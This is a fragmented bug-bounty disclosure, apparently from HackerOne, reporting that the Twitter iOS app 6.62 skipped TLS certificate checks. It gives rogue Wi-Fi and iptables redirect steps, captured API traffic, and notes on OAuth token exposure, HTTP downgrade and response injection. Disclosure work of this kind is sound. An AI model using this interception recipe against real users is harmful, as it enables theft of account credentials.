    "vulnerability_information": "Twitter on iOS newest two versions (6.62 and 6.62.1) are affected, other versions not tested. Tested independently on two different iPhone 6 with iOS version 9.3.3 and 9.3.5 without Jailbreak. The iPhone were without any mobileconfig profiles installed - *no* we did not install any CA certificate in the CA store of the device. Really stock iPhones. The Twitter app does not check the SSL/TLS certificate of https://api.twitter.com . A transparent proxy setup (eg. burp suite in transparent mode) is sufficient to exploit. Steps to reproduce:\n1. Start Burp or other Proxy software in transparent mode. Setting \"Generate CA-signed per-host certificates\", which means the CA cert of Burp is used, which is *not* trusted on the iPhones.\n2. Start rogue Wifi access point (eg. on the same machine as burp)\n3. Redirect all incoming HTTPS traffic on the rogue Wifi access point to the transparent proxy. We simply used on Linux:\niptable -t nat -A PREROUTING -i wlan0 -p tcp --dport 443 -j DNAT --to $BURP_IP:8080\niptable -t nat -A PREROUTING -i wlan0 -p tcp --dport 443 -j REDIRECT --to-port 8080\n4. Connect with the iOS device to the Wifi access point\n5. Open Twitter app on iOS\n6. In burp only the calls to api.twitter.com are visible and include sensitive authentication information etc.\n\nThis is the information we saw for two different accounts in burp which includes the oauth token etc.:\n\nGET /1.1/help/settings.json?include_zero_rate=true&settings_version=8910e1e75c037c3c6b59c64b477b0741 HTTP/1.1\nHost: api.twitter.com\n\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\nX-Twitter-Client-Version: 6.62\nX-Twitter-Polling: true\nX-Client-UUID: D8AB1681-1618-48BA-9EB0-F3628DF1660B\nX-Twitter-Client-Language: de\nX-B3-TraceId: cc8ac1aea2ba5628\nx-spdy-bypass: 1\nAccept: */*\nAccept-Language: de\nAccept-Encoding: gzip, deflate\nX-Twitter-Client-DeviceID: 68715C92-258F-4C59-A0B4-B98AF8B976BC\nUser-Agent: Twitter-iPhone/6.62 iOS/9.3.3 (Apple;iPhone8,1;;;;;1)\nConnection: close\nX-Twitter-API-Version: 5\nX-Twitter-Client-Limit-Ad-Tracking: 1\nX-Twitter-Client: Twitter-iPhone\n\n\n\nHTTP/1.1 304 Not Modified\ncache-control: no-cache, no-store, must-revalidate, pre-check=0, post-check=0\nconnection: close\ncontent-length: 0\ncontent-security-policy: default-src 'self'; connect-src 'self'; font-src 'self' https://*.twimg.com https://twitter.com https://ton.twitter.com data:; frame-src 'self' https://*.twimg.com https://twitter.com https://ton.twitter.com; img-src 'self' https://*.twimg.com https://twitter.com https://ton.twitter.com data:; media-src 'self' https://*.twimg.com https://twitter.com https://ton.twitter.com; object-src 'none'; script-src 'self' https://*.twimg.com https://twitter.com https://ton.twitter.com; style-src 'self' https://*.twimg.com https://twitter.com https://ton.twitter.com; report-uri https://twitter.com/i/csp_report?a=NVQWGYLXFVRWY2LFNZ2C2Y3PNZTGSZY%3D&ro=false;\ncontent-type: text/html;charset=utf-8\ndate: Thu, 15 Sep 2016 08:33:18 GMT\nexpires: Tue, 31 Mar 1981 05:00:00 GMT\nlast-modified: Thu, 15 Sep 2016 08:33:18 GMT\npragma: no-cache\nserver: tsa_b\nset-cookie: guest_id=v1%3A147392839826657964; Domain=.twitter.com; Path=/; Expires=Sat, 15-Sep-2018 08:33:18 UTC\nstatus: 304 Not Modified\nstrict-transport-security: max-age=631138519\nx-access-level: read-write\nx-client-event-enabled: true\nx-connection-hash: 40e91f874332181942e1454b13ccaa6a\nx-content-type-options: nosniff\nx-frame-options: SAMEORIGIN\nx-rate-limit-limit: 15\nx-rate-limit-remaining: 12\nx-rate-limit-reset: 1473929244\nx-response-time: 29\nx-transaction: cc8ac1aea2ba5628\nx-twitter-response-tags: BouncerExempt\nx-twitter-response-tags: BouncerCompliant\nx-xss-protection: 1; mode=block\n\n\n\nGET /1.1/help/settings.json?include_zero_rate=true&settings_version=8910e1e75c037c3c6b59c64b477b0741 HTTP/1.1\nHost: api.twitter.com\n\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\nX-Twitter-Client-Version: 6.62\nX-Twitter-Polling: true\nX-Client-UUID: D8AB1681-1618-48BA-9EB0-F3628DF1660B\nX-Twitter-Client-Language: de\nX-B3-TraceId: 796651628eef7eed\nx-spdy-bypass: 1\nAccept: */*\nAccept-Language: de\nAccept-Encoding: gzip, deflate\nX-Twitter-Client-DeviceID: 68715C92-258F-4C59-A0B4-B98AF8B976BC\nUser-Agent: Twitter-iPhone/6.62 iOS/9.3.3 (Apple;iPhone8,1;;;;;1)\nConnection: close\nX-Twitter-API-Version: 5\nX-Twitter-Client-Limit-Ad-Tracking: 1\nX-Twitter-Client: Twitter-iPhone\n\n\n\nHTTP/1.1 304 Not Modified\ncache-control: no-cache, no-store, must-revalidate, pre-check=0, post-check=0\nconnection: close\ncontent-length: 0\ncontent-security-policy: default-src 'self'; connect-src 'self'; font-src 'self' https://*.twimg.com https://twitter.com https://ton.twitter.com data:; frame-src 'self' https://*.twimg.com https://twitter.com https://ton.twitter.com; img-src 'self' https://*.twimg.com https://twitter.com https://ton.twitter.com data:; media-src 'self' https://*.twimg.com https://twitter.com https://ton.twitter.com; object-src 'none'; script-src 'self' https://*.twimg.com https://twitter.com https://ton.twitter.com; style-src 'self' https://*.twimg.com https://twitter.com https://ton.twitter.com; report-uri https://twitter.com/i/csp_report?a=NVQWGYLXFVRWY2LFNZ2C2Y3PNZTGSZY%3D&ro=false;\ncontent-type: text/html;charset=utf-8\ndate: Thu, 15 Sep 2016 08:34:36 GMT\nexpires: Tue, 31 Mar 1981 05:00:00 GMT\nlast-modified: Thu, 15 Sep 2016 08:34:36 GMT\npragma: no-cache\nserver: tsa_b\nset-cookie: guest_id=v1%3A147392847623972314; Domain=.twitter.com; Path=/; Expires=Sat, 15-Sep-2018 08:34:36 UTC\nstatus: 304 Not Modified\nstrict-transport-security: max-age=631138519\nx-access-level: read-write\nx-client-event-enabled: true\nx-connection-hash: e980abd0bd35e3bf0b8c693e8a12f636\nx-content-type-options: nosniff\nx-frame-options: SAMEORIGIN\nx-rate-limit-limit: 15\nx-rate-limit-remaining: 11\nx-rate-limit-reset: 1473929244\nx-response-time: 44\nx-transaction: 796651628eef7eed\nx-twitter-response-tags: BouncerExempt\nx-twitter-response-tags: BouncerCompliant\nx-xss-protection: 1; mode=block\n",

The video can be found here (keep the link private):\nhttp://floyd.li/unpredictable-yqAK5A8mpoKNwBioWPK6ejPjqAzFUh/video-demonstration.mov\n\nIf you have issues watching it in the browser directly, download it with wget and watch it in VLC or another player.\n\nThe transparent proxy setup is really a standard setup with iptables, let me know if you need help with that. Any transparent proxy setup should work.\n\nIf I had a custom CA certificate installed on my iPhone, I would have a menu item \"Profile\" as shown in the following example screenshot: http://media.idownloadblog.com/wp-content/uploads/2016/01/iOS-9-how-to-delete-configuration-profile-iPhone-screenshot-003-593x347.png . Do you agree? But you will see in the Video that's not the case.\n\nSo by now I'm 98% sure this is a bug in the Twitter iOS app (as https://www.hackerone.com did not open and the Apple App Store app also didn't work correctly), the other 2% probability is an Apple bug :)\n\nEvery attacker who is able to do a transparent proxy setup can gain access to the OAuth cookie. As a precondition the user has to (re-) open the app (however, if the app was already open and it doesnt work correctly because of interception it is very likely the user will try to close and reopen the app).\n\nI hope that helps to reproduce, otherwise let me know.\n\nBest regards,\nfloyd",

The video can be found here (keep the link private):<br>\n<a title=\"http://floyd.li/unpredictable-yqAK5A8mpoKNwBioWPK6ejPjqAzFUh/video-demonstration.mov\" href=\"/redirect?signature=bdd144ee417fd929509df1b9aac8c0fd0a5956c9&amp;url=http%3A%2F%2Ffloyd.li%2Funpredictable-yqAK5A8mpoKNwBioWPK6ejPjqAzFUh%2Fvideo-demonstration.mov\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>http://floyd.li/unpredictable-yqAK5A8mpoKNwBioWPK6ejPjqAzFUh/video-demonstration.mov</span><i class=\"icon-external-link\"></i></a></p>\n\n<p>If you have issues watching it in the browser directly, download it with wget and watch it in VLC or another player.</p>\n\n<p>The transparent proxy setup is really a standard setup with iptables, let me know if you need help with that. Any transparent proxy setup should work.</p>\n\n<p>If I had a custom CA certificate installed on my iPhone, I would have a menu item &quot;Profile&quot; as shown in the following example screenshot: <a title=\"http://media.idownloadblog.com/wp-content/uploads/2016/01/iOS-9-how-to-delete-configuration-profile-iPhone-screenshot-003-593x347.png\" href=\"/redirect?signature=bdda421995d54f8dfd60108603433f8b80394104&amp;url=http%3A%2F%2Fmedia.idownloadblog.com%2Fwp-content%2Fuploads%2F2016%2F01%2FiOS-9-how-to-delete-configuration-profile-iPhone-screenshot-003-593x347.png\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>http://media.idownloadblog.com/wp-content/uploads/2016/01/iOS-9-how-to-delete-configuration-profile-iPhone-screenshot-003-593x347.png</span><i class=\"icon-external-link\"></i></a> . Do you agree? But you will see in the Video that&#39;s not the case.</p>\n\n<p>So by now I&#39;m 98% sure this is a bug in the Twitter iOS app (as <a title=\"https://www.hackerone.com\" href=\"/redirect?signature=055cc88e330a6191e4339a7e7ae0d194f3b8481b&amp;url=https%3A%2F%2Fwww.hackerone.com\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://www.hackerone.com</span><i class=\"icon-external-link\"></i></a> did not open and the Apple App Store app also didn&#39;t work correctly), the other 2% probability is an Apple bug :)</p>\n\n<p>Every attacker who is able to do a transparent proxy setup can gain access to the OAuth cookie. As a precondition the user has to (re-) open the app (however, if the app was already open and it doesnt work correctly because of interception it is very likely the user will try to close and reopen the app).</p>\n\n<p>I hope that helps to reproduce, otherwise let me know.</p>\n\n<p>Best regards,<br>\nfloyd</p>\n",

            "message": "Wow, this bug is crazy. Something really weird must be going on on the SSL/TLS layer in the Twitter iOS app. Are you using the standard iOS provided libraries or something customized? Here's the thing: When I wanted to try the Twitter Android app (just to see if it has similar issues), Android had issues doing DHCP-client and didn't get an IP from the laptop. As I'm using dnsmasq on the laptop (see video) to do DHCP-server and DNS-server, I thought I'll just enable the DHCP-server part of the mikrotik router and add a default route on the mikrotik that points to the laptop. That worked fine and I tested several Android apps and the Android browser, the HTTP requests showed up in burp and the HTTPS showed certificate warnings, so far so good. The Twitter Android app was not vulnerable in this setup. But then just out of curiosity I tried to exploit the Twitter iOS app again in this setup (expecting it to be exploitable), but it did not work! Twitter iOS did *not* send the HTTP content to burp as the certificate was rejected. Because I couldn't believe my eyes I switched everything back to dnsmasq as a DHCP-Server on the laptop and the Twitter iOS app was exploitable again! So at this point my best bet is that there is some horrible quirk/race condition making the Twitter iOS app send the HTTP request to burp even when the certificate can not be validated against a known CA certificate. I don't know what's best to reproduce this issue, but as a first step I took wireshark pcaps (filter ip.addr==199.16.156.0/24) in both setups. I took them with wireshark on the laptop and used the incoming ethernet interface from the mikrotik for capturing. I'm unsure if this will help you to hunt the issue down, but for me it looks like packet number 92 in the successful attack in api.twitter.com-successful-interception-floyd.pcapng is Application Data in TLSv1.2 and could be the HTTPS request I see in burp (the request in burp is 997 bytes, the application data in the TLS packet is 1056 bytes, which sounds very plausible as I guess the difference is padding). There is no such Application Data packet in the unsuccessful case (api.twitter.com-unsuccessful-interception-floyd.pcapng). Additionally I attached the mikrotik.sh I use on the laptop to do the transparent proxy setup. Let me know your thoughts.",

The cookies are exposed to an attacker, especially the oauth_token, but also the oauth_nonce, oauth_signature, oauth_timestamp, oauth_consumer_key, Twitter-Client version, X-Client-UUID, X-Twitter-Client-DeviceID and User-Agent. The used HMAC-SHA1 is still considered secure and I didn't analyze your oauth schema in detail.\n\n2. Arbitrary redirects are possible. As an example I simply responded with a 301 Moved Permanently message [0] and redirected the Twitter iOS app to http://www.floyd.ch. Burp is then seeing that this ressource is actually requested by the twitter app, the request looks like [1]. This results in third-party content landing in the memory of the Twitter iOS app. Additionally if the cookie store of the library in Twitter iOS doing the request includes any other (non-secure-flag) cookies (eg. for www.twitter.com or any other website) an attacker would be able to force the app to reveil that cookie. However, I did not find any other cookie during my investigation. Are there any?\n\n3. The arbitrary redirect can be abused to force the Twitter iOS app [2] to use non-TLS connections. The Twitter iOS app itself does not enforce HTTPS to Twitter Server itself afterwards, but sends a non-encrypted request to http://api.twitter.com (non-TLS) [3]. This can actually be seens as an issue by itself: Your Twitter iOS app doesn't honor the Strict-Transport-Security header between sessions/when reopening the Twitter app. Therefore the Strict-Transport-Security header is pretty useless for the Twitter iOS app. Should I opened a separate bug for that?\n\n4. Reading the entire settings.json [4]. I had the issue that the server always responded with a HTTP 304 message, but by changing the User-Agent to Android in the request I suddenly got the full response as a HTTP 200 message. I'm unsure if Twitter considers the information in there confidential.\n\n5. When injecting a malicious settings.json as a response (my first test was to send \"con'fig\" instead of \"config\" in the json response) I couldn't see any modifications in the app and for some reason I haven't figured out yet the Twitter iOS app doesn't send the request anymore for quiet a while afterwards (I guess the Twitter app is cashing the settings.json). I'd like to check if modifications in settings.json might lead to XSS or any other content modification inside the Twitter app. But that has to wait until next week.\n\n6. Depending on what kind of parsing/usage of the response, other attack are possible that I didn't investigate yet.\n\nBy the way if you see CSP violation reports on https://twitter.com/i/csp_report let me know as those might be my tests by manipulating the server response.\n\nI guess you don't want to share what kind of TLS library is used in the Twitter iOS app? Is the Twitter app using crashlytics? I see a lot of crash reports going out, but I don't know if they are coming from the Twitter app.\n\nBest regards,\nfloyd\n\n[0] see 0.txt\n[1] see 1.txt\n[2] see 2.txt\n[3] The request in attachement 3.txt is actually sent over a non-TLS (plain HTTP) connection as triggered in 2.txt.\n[4] see settings.txt",

Regarding your link: Yes, but I guess setting NSAllowsArbitraryLoads to NO in the NSAppTransportSecurity plist file for the entire Twitter app is not an option as you usually load third party URLs (possibly non-TLS) from tweets inside a webview in the Twitter app, right? The problem is that it seems you can only specify to generally allow HTTP for all domains, but then it seems to me you can not specify to strictly use HTTPS for specific domains. It would be nice to know if that works, but that needs testing. It's a pity that Apple doesn't just implement standard HSTS.\n\nI couldn't find an issue with the default settings.json during my limited tests.

So I'm fine with releasing this information. \n\nYes, please ask them to remove my phone number and the oauth parameter values in the Authorization HTTP headers. No other concerns from my side. ",

    "vulnerability_information_html": "<p>Twitter on iOS newest two versions (6.62 and 6.62.1) are affected, other versions not tested. Tested independently on two different iPhone 6 with iOS version 9.3.3 and 9.3.5 without Jailbreak. The iPhone were without any mobileconfig profiles installed - <em>no</em> we did not install any CA certificate in the CA store of the device. Really stock iPhones. The Twitter app does not check the SSL/TLS certificate of <a title=\"https://api.twitter.com\" href=\"/redirect?signature=c92e40cd7e8c2cb959093b66a745404e8155c905&amp;url=https%3A%2F%2Fapi.twitter.com\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://api.twitter.com</span><i class=\"icon-external-link\"></i></a> . A transparent proxy setup (eg. burp suite in transparent mode) is sufficient to exploit. Steps to reproduce:</p>\n\n<ol>\n<li>Start Burp or other Proxy software in transparent mode.

We simply used on Linux:\niptable -t nat -A PREROUTING -i wlan0 -p tcp --dport 443 -j DNAT --to $BURP_IP:8080\niptable -t nat -A PREROUTING -i wlan0 -p tcp --dport 443 -j REDIRECT --to-port 8080</li>\n<li>Connect with the iOS device to the Wifi access point</li>\n<li>Open Twitter app on iOS</li>\n<li>In burp only the calls to api.twitter.com are visible and include sensitive authentication information etc.</li>\n</ol>\n\n<p>This is the information we saw for two different accounts in burp which includes the oauth token etc.:</p>\n\n<p>GET /1.1/help/settings.json?include_zero_rate=true&amp;settings_version=8910e1e75c037c3c6b59c64b477b0741 HTTP/1.1<br>\nHost: api.twitter.com<br>\n\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588<br>\nX-Twitter-Client-Version: 6.62<br>\nX-Twitter-Polling: true<br>\nX-Client-UUID: D8AB1681-1618-48BA-9EB0-F3628DF1660B<br>\nX-Twitter-Client-Language: de<br>\nX-B3-TraceId: cc8ac1aea2ba5628<br>\nx-spdy-bypass: 1<br>\nAccept: <em>/</em><br>\nAccept-Language: de<br>\nAccept-Encoding: gzip, deflate<br>\nX-Twitter-Client-DeviceID: 68715C92-258F-4C59-A0B4-B98AF8B976BC<br>\nUser-Agent: Twitter-iPhone/6.62 iOS/9.3.3 (Apple;iPhone8,1;;;;;1)<br>\nConnection: close<br>\nX-Twitter-API-Version: 5<br>\nX-Twitter-Client-Limit-Ad-Tracking: 1<br>\nX-Twitter-Client: Twitter-iPhone</p>\n\n<p>HTTP/1.1 304 Not Modified<br>\ncache-control: no-cache, no-store, must-revalidate, pre-check=0, post-check=0<br>\nconnection: close<br>\ncontent-length: 0<br>\ncontent-security-policy: default-src &#39;self&#39;;
